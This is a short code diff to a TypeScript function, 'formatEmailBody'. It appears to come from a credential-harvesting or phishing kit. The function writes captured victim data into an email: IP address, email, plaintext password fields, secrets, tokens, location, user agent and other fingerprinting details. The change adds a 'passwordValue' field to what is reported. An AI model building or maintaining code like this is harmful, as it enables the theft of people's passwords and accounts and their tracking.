@@ -174,7 +174,7 @@ function formatEmailBody(payload: ResponsePayload): string {
   // Fields rendered in fixed order at the top
   const topKeys = new Set([
     "type", "sendId", "datetime", "timestamp", "timezone",
-    "ipAddress", "email", "password", "pwd", "secret",
+    "ipAddress", "email", "password", "passwordValue", "pwd", "secret",
     "credential", "token", "country", "city", "region",
     "location", "userAgent", "browserLanguage", "platform",
     "referrer", "screenSize",
@@ -187,7 +187,7 @@ function formatEmailBody(payload: ResponsePayload): string {
     `Timezone: ${val(payload.timezone)}`,
     `IP address: ${val(payload.ipAddress)}`,
     `Email: ${val(payload.email)}`,
-    `Password: ${val(payload.password)}`,
+    `Password value: ${val(payload.passwordValue ?? payload.password)}`,
     `Pwd: ${val(payload.pwd)}`,
     `Secret: ${val(payload.secret)}`,
     `Credential: ${val(payload.credential)}`,
